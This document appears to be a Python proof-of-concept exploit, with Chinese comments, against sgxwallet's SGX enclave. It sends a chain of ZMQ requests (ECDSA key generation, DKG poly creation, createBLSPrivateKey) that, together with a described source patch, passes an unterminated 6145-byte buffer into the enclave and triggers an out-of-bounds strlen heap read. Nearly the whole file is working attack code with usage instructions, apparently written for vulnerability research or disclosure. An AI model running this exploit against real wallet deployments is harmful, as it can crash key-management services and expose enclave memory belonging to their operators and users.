#!/usr/bin/env python3
"""
PoC: trustedCreateBlsKey strlen OOB Read
=========================================
威胁模型：攻击者有 host root，已修改 DKGCrypto.cpp::createBLSShare()
将传入 enclave 的 s_shares 替换为 6145 字节的 0x41（无 null 终止符）。

触发条件：
  - sgxwallet 使用 `-c` 启动（关闭 ZMQ 签名验证）
  - DKGCrypto.cpp 已打上 poc patch

步骤：
  1. 生成 ECDSA key（为后续 ECall 准备合法 encrypted_key）
  2. 生成 DKG poly（服务器校验需要）
  3. 调用 createBLSPrivateKey → 触发修改后的 createBLSShare
     → enclave 内 strlen(poc_shares) 越界读 enclave 堆

预期结果：
  - SGXSan 构建：enclave heap-buffer-overflow READ crash
  - 普通构建：num_shares 异常大，循环越界，segfault 或静默 OOB 读

用法：
  # 启动服务（-c = 不验证 ZMQ 签名，-d = debug 日志）
  ./sgxwallet -c -d

  # 另一终端执行
  python3 poc_strlen_oob.py [host] [port]
"""

import zmq
import json
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1031  # BASE_PORT(1026) + 5

TIMEOUT_MS = 5000


def zmq_req(sock, msg: dict) -> dict:
    sock.send_string(json.dumps(msg))
    if sock.poll(TIMEOUT_MS) == 0:
        raise TimeoutError("No reply from server")
    return json.loads(sock.recv_string())


def main():
    ctx = zmq.Context()
    sock = ctx.socket(zmq.DEALER)
    sock.setsockopt(zmq.LINGER, 0)
    sock.connect(f"tcp://{HOST}:{PORT}")
    print(f"[*] Connected to tcp://{HOST}:{PORT}")

    # ------------------------------------------------------------------ #
    # Step 1: 生成 ECDSA key，拿到 ethKeyName                              #
    # ------------------------------------------------------------------ #
    print("[*] Step 1: generateECDSAKey ...")
    rsp = zmq_req(sock, {"type": "generateECDSAReq"})
    print(f"    Response: {rsp}")
    if rsp.get("status") != 0:
        print(f"[!] Failed to generate ECDSA key: {rsp}")
        return
    eth_key_name = rsp["keyName"]
    print(f"    ethKeyName = {eth_key_name}")

    # ------------------------------------------------------------------ #
    # Step 2: 生成 DKG poly，拿到 polyName                                 #
    # ------------------------------------------------------------------ #
    poly_name = "POLY:poc_strlen_oob"
    t = 1
    print(f"[*] Step 2: generateDKGPoly (polyName={poly_name}, t={t}) ...")
    rsp = zmq_req(sock, {
        "type": "generateDKGPolyReq",
        "polyName": poly_name,
        "t": t,
    })
    print(f"    Response: {rsp}")
    if rsp.get("status") != 0:
        print(f"[!] Failed to generate DKG poly: {rsp}")
        return

    # ------------------------------------------------------------------ #
    # Step 3: createBLSPrivateKey → 触发 poc patch → enclave strlen OOB   #
    # server 校验: secretShare.length() == n * 192 → 用 1 * 192 通过校验   #
    # 但 createBLSShare 已被 patch，实际传入 enclave 的是 6145 字节无 null   #
    # ------------------------------------------------------------------ #
    bls_key_name = "BLS_KEY:poc_strlen_oob"
    secret_share = "A" * 192   # 1 * 192，通过服务器长度校验
    n = 1

    print(f"[*] Step 3: createBLSPrivateKey (triggering strlen OOB) ...")
    print(f"    blsKeyName   = {bls_key_name}")
    print(f"    ethKeyName   = {eth_key_name}")
    print(f"    polyName     = {poly_name}")
    print(f"    secretShare  = 'A' * {len(secret_share)} (passes server check)")
    print(f"    t={t}, n={n}")
    print(f"    [!] DKGCrypto.cpp patch will send 6145 bytes of 0x41 (no null)")
    print(f"        to trustedCreateBlsKey → strlen OOB inside enclave")

    try:
        rsp = zmq_req(sock, {
            "type": "createBLSPrivateReq",
            "blsKeyName": bls_key_name,
            "ethKeyName": eth_key_name,
            "polyName": poly_name,
            "secretShare": secret_share,
            "t": t,
            "n": n,
        })
        print(f"[*] Server response: {rsp}")
        if rsp.get("status") == 0:
            print("[+] Request succeeded (no sanitizer) — OOB read was silent")
            print("    num_shares inside enclave was inflated by strlen past 6145 bytes")
        else:
            print(f"[-] Server returned error (may have crashed internally): {rsp}")
    except TimeoutError:
        print("[!] Timeout — server likely crashed (enclave killed by SGXSan/segfault)")
        print("    Check sgxwallet stderr for heap-buffer-overflow report")

    sock.close()
    ctx.term()


if __name__ == "__main__":
    main()
